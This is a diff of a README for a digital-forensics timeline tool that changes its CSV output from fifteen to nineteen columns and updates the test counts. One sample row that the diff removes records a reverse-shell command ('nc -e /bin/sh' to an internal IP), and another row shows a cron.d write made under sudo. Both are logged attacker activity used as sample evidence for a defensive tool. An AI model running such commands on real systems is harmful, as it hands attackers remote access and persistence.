@@ -56,14 +56,15 @@ Add `--hunt` to any of them. Add `-m evtx`, `-m registry`, `-m windows` or `-m l
 
 ## What comes out
 
-One RFC 4180 CSV with fifteen columns: ten that describe the event (`timestamp, computer, artifact, event_id, pid, subject_username, target_username, processname, commandline, parentprocessname`) and the analysis tail that [masstin](https://github.com/jupyterj0nes/masstin), faramir and allymacb close their timelines with (`hunt, hunt_score, hunt_why, verdict, notes`), with the same words and the same scale in the four tools, so a case tool maps it once. Timestamps are UTC with a fixed width, so sorting the text sorts the time. Open it in Timeline Explorer or Excel.
+One RFC 4180 CSV with nineteen columns: fourteen that describe the event and the analysis tail that [masstin](https://github.com/jupyterj0nes/masstin), faramir and allymacb close their timelines with (`hunt, hunt_score, hunt_why, verdict, notes`). The fourteen sit in the verticals of masstin's timeline, each under the masstin column closest in meaning (time, host, event type, id, how the row was obtained, who it ran as, the image, its parent, who ran it, the process id, the command line, the file it was read from; two `reserved_` columns where masstin's domains have no execution equivalent), so the four timelines of one case read side by side and a case tool maps each header once. Timestamps are UTC with a fixed width, so sorting the text sorts the time. Open it in Timeline Explorer or Excel.
 
 ```csv
-"2016-09-21T03:41:02.560546Z","IE10Win7","evtx:4688",4688,3744,"WORKGROUP\IE10WIN7$","","C:\Windows\duKhLYUX.exe","C:\Windows\duKhLYUX.exe","",,,,,
-"2025-09-26T00:01:40.243000Z","victim01","linux:audit:execve",0,3538,"1000","1000","/usr/bin/nc","nc -e /bin/sh 10.0.0.5 (CWD: /tmp)","PID: 2686",,,,,
+timestamp,computer,artifact,event_id,state,target_username,reserved_1,processname,parentprocessname,subject_username,reserved_2,pid,commandline,source_file,hunt,hunt_score,hunt_why,verdict,notes
+"2016-09-21T03:41:02.560546Z","IE10Win7","evtx:4688",4688,"live","","","C:\Windows\duKhLYUX.exe","","WORKGROUP\IE10WIN7$","",3744,"C:\Windows\duKhLYUX.exe","metasploit-psexec-native-target-security.evtx",,,,,
+"2026-10-28T22:01:03.000000Z","rf-1a182f1b960-leo-lnx01","linux:syslog:sudo",0,"live","root","","/usr/bin/tee","sudo","c00pr","",0,"/usr/bin/tee /etc/cron.d/caarea","lnx01-logs:var/log/auth.log",,,,,
 ```
 
-The `artifact` column names the source and how the row was obtained: `evtx:4688`, `registry:bam:deleted`, `evtx:4688:vss [2026-09-04T08:12:53Z]`, `prefetch:carved [pagefile @0x4f000]`. Every column, with the rules of the tail: [the CSV →](docs/csv-format.md)
+`artifact` names the source, `state` says how the row was obtained (`live`, `vss`, `deleted`, `txlog`, `carved`), `source_file` the file it was read from inside its container (`disk:partition_0_vss_0/Windows/System32/winevt/Logs/Security.evtx`). Every column, with the rules of the tail: [the CSV →](docs/csv-format.md)
 
 ## What it reads
 
@@ -80,7 +81,7 @@ Event ids, keys and the notes on each source: [What it reads →](docs/sources.m
 
 ## Process hunting
 
-`--hunt` runs the rules over the finished timeline and fills the tail of each row it judges: `hunt` is `significant` or `candidate` (or `habitual` when a clean reference host executes the same thing), `hunt_score` is how rare the row is on masstin's scale, 0 to 100, and `hunt_why` names every rule that fired, strongest first, then the lineage. The ten event columns do not change a byte. The detailed findings, with the catalogue score and the ATT&CK technique of every hit, go to a second CSV next to the timeline, and the console closes with the rows that deserve reading first: state, score, when and what ran, who created it, every rule that fired and, in words, why that matters. Rows that say the same thing (the same process, the same rules) are one entry with a count.
+`--hunt` runs the rules over the finished timeline and fills the tail of each row it judges: `hunt` is `significant` or `candidate` (or `habitual` when a clean reference host executes the same thing), `hunt_score` is how rare the row is on masstin's scale, 0 to 100, and `hunt_why` names every rule that fired, strongest first, then the lineage. The fourteen event columns do not change a byte. The detailed findings, with the catalogue score and the ATT&CK technique of every hit, go to a second CSV next to the timeline, and the console closes with the rows that deserve reading first: state, score, when and what ran, who created it, every rule that fired and, in words, why that matters. Rows that say the same thing (the same process, the same rules) are one entry with a count.
 
 <div align="center">
   <img src="resources/hunt-rows.svg" alt="Three judged rows from the DeepBlueCLI set: a PsExec dropper at the root of C:\Windows with a random name, an installer run from an archive's temp folder, msiexec launched by Chrome; each with its hunt state, its score and the rules in words" width="100%"/>
@@ -93,7 +94,7 @@ The rules only state what a documented source states: the expected-parent and al
 | Topic | Where |
 | :--- | :--- |
 | Every source, with event ids, keys and the notes on each | [docs/sources.md](docs/sources.md) |
-| The fifteen columns, the analysis tail, how to read the CSV | [docs/csv-format.md](docs/csv-format.md) |
+| The nineteen columns in masstin's verticals, the analysis tail, how to read the CSV | [docs/csv-format.md](docs/csv-format.md) |
 | Process hunting: rules, process tree, how `hunt_score` is measured, the clean reference | [docs/hunting.md](docs/hunting.md) |
 | Carving: what is looked for in raw bytes and how a structure proves itself | [docs/carving.md](docs/carving.md) |
 | Time zones of Linux logs | [docs/time-zones.md](docs/time-zones.md) |
@@ -104,7 +105,7 @@ The rules only state what a documented source states: the expected-parent and al
 
 ## How it is tested
 
-`cargo test` runs 152 tests: real-layout records for every binary format, real auditd lines, the public TZif files of two zones, safety tests that try to break out of the staging folder, and the identities the clean reference is matched by. Beyond them, the parsers were checked against:
+`cargo test` runs 153 tests: real-layout records for every binary format, real auditd lines, the public TZif files of two zones, safety tests that try to break out of the staging folder, and the identities the clean reference is matched by. Beyond them, the parsers were checked against:
 
 - 524 public EVTX samples ([EVTX-ATTACK-SAMPLES](https://github.com/sbousseaden/EVTX-ATTACK-SAMPLES), [EVTX-to-MITRE-Attack](https://github.com/mdecrevoisier/EVTX-to-MITRE-Attack), DeepBlueCLI): the count per file matches `Get-WinEvent` exactly for every supported event id.
 - The registry test corpus of [yarp](https://github.com/msuhanov/yarp): the transaction log replay (in the shared [blockcarve](https://github.com/jupyterj0nes/blockcarve) crate) gives the same hive bins as Windows 10 and Windows 7 when they recovered those dirty hives themselves.
@@ -119,7 +120,6 @@ The TaskScheduler operational channel is off by default on Windows clients and n
 - XFS and btrfs partitions are not read yet; `hiberfil.sys` is scanned raw, its compressed pages are not decoded.
 - Classic syslog has no year; it is inferred from the file's modification time, so logs spanning more than a year lose precision.
 - On a Windows host with the default audit policy there is no 4688 at all, and without command-line auditing the command line is empty; the hunt's genealogy rules need one of Security 4688, Sysmon 1, auditd or `pacct`.
-- The CSV has no "source file" column by design; run with `-m` or per package when you need that separation.
 
 ## The family
 
